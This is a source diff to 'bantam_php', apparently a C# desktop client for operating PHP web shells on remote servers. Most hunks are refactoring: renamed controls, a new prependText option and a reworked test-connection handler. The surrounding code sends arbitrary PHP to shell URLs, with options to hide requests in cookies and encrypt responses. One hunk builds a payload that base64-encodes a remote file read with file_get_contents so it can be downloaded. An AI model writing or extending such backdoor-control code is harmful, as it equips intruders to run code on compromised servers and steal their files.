@@ -101,12 +101,18 @@ namespace bantam_php
         }
 
         /// <summary>
-        /// Starts a thread that executes the php code
+        /// 
         /// </summary>
+        /// <param name="url"></param>
         /// <param name="phpCode"></param>
         /// <param name="title"></param>
-        public static async void executePHPCodeDisplayInRichTextBox(string url, string phpCode, string title, bool encryptResponse, int responseEncryptionMode, RichTextBox richTextBox = null)
+        /// <param name="encryptResponse"></param>
+        /// <param name="responseEncryptionMode"></param>
+        /// <param name="richTextBox"></param>
+        /// <param name="prependText"></param>
+        public static async void executePHPCodeDisplayInRichTextBox(string url, string phpCode, string title, bool encryptResponse, int responseEncryptionMode, RichTextBox richTextBox = null, string prependText = "")
         {
+            //todo this doesn't have a timeout
             ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(url, phpCode, encryptResponse));
 
             if (string.IsNullOrEmpty(response.Result) == false) {
@@ -122,6 +128,10 @@ namespace bantam_php
                 }
 
                 result = result.Replace(PhpHelper.rowSeperator, "\r\n");
+
+                if (!string.IsNullOrEmpty(prependText)) {
+                    result = prependText + result + "\r\n";
+                }
 
                 if (richTextBox != null && richTextBox.IsDisposed == false) {
                     richTextBox.Text += result;
@@ -141,7 +151,6 @@ namespace bantam_php
         public async void InitializeShellData(string shellUrl)
         {
             if (string.IsNullOrEmpty(shellUrl) == false) {
-
                 string[] data = { null };     
                 bool encryptResponse = Shells[shellUrl].responseEncryption;
                 int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
@@ -435,7 +444,7 @@ namespace bantam_php
                     lblDynPHP.Text = Shells[g_SelectedShellUrl].PHP_Version;
                 }
 
-                if (tabControl1.SelectedTab == tabPageFiles) {
+                if (tabControlMain.SelectedTab == tabPageFiles) {
                     if (Shells[g_SelectedShellUrl].files.Nodes != null
                      && Shells[g_SelectedShellUrl].files.Nodes.Count > 0) {
                         GuiHelper.CopyNodesFromTreeView(Shells[g_SelectedShellUrl].files, treeViewFileBrowser);
@@ -462,7 +471,7 @@ namespace bantam_php
             }
 
             string shellUrl = g_SelectedShellUrl;
-            if (tabControl1.SelectedTab == tabPageFiles) {
+            if (tabControlMain.SelectedTab == tabPageFiles) {
                 //if the gui's treeview is empty and the cached treeview data is not empty
                 if (treeViewFileBrowser.Nodes.Count == 0
                 && Shells[shellUrl].files.Nodes != null
@@ -561,7 +570,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void pingToolStripMenuItem1_Click(object sender, EventArgs e)
+        private void testConnectionStripMenuItem1_Click(object sender, EventArgs e)
         {
             if (string.IsNullOrEmpty(g_SelectedShellUrl)
              || Shells.ContainsKey(g_SelectedShellUrl) == false) {
@@ -569,22 +578,18 @@ namespace bantam_php
             }
 
             string shellURL = g_SelectedShellUrl;
-            string requestArgName = Shells[shellURL].requestArgName;
-            bool sendViaCookie = Shells[shellURL].sendDataViaCookie;
-            bool encryptResponse = Shells[shellURL].responseEncryption;
-            int responseEncryptionMode = Shells[shellURL].responseEncryptionMode;
-            bool gzipRequest = Shells[shellURL].gzipRequestData;
+            ShellInfo shellInfo = Shells[shellURL];
+
+            string requestArgName = shellInfo.requestArgName;
+            bool sendViaCookie = shellInfo.sendDataViaCookie;
+            bool encryptResponse = shellInfo.responseEncryption;
+            int responseEncryptionMode = shellInfo.responseEncryptionMode;
+            bool gzipRequest = shellInfo.gzipRequestData;
 
             listViewShells.FindItemWithText(shellURL).Remove();
             Shells.Remove(shellURL);
-
-            Shells.Add(shellURL, new ShellInfo());
-            Shells[shellURL].requestArgName = requestArgName;
-            Shells[shellURL].sendDataViaCookie = sendViaCookie;
-            Shells[shellURL].responseEncryption = encryptResponse;
-            Shells[shellURL].responseEncryptionMode = responseEncryptionMode;
-            Shells[shellURL].gzipRequestData = gzipRequest;
-
+           
+            Shells.Add(shellURL, shellInfo);
             InitializeShellData(shellURL);
         }
 
@@ -913,8 +918,8 @@ namespace bantam_php
                 }
             }
 
-            if (tabControl1.SelectedTab != tabPageFiles) {
-                tabControl1.SelectedTab = tabPageFiles;
+            if (tabControlMain.SelectedTab != tabPageFiles) {
+                tabControlMain.SelectedTab = tabPageFiles;
             }
         }
 
@@ -1325,6 +1330,7 @@ namespace bantam_php
 
             if (downloadFileDialog.ShowDialog() == DialogResult.OK) {
                 if (!string.IsNullOrEmpty(downloadFileDialog.FileName)) {
+                    //todo move phpcode
                     string phpCode = "@$result = @base64_encode(@file_get_contents('" + fileName + "'));";
                     ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
 
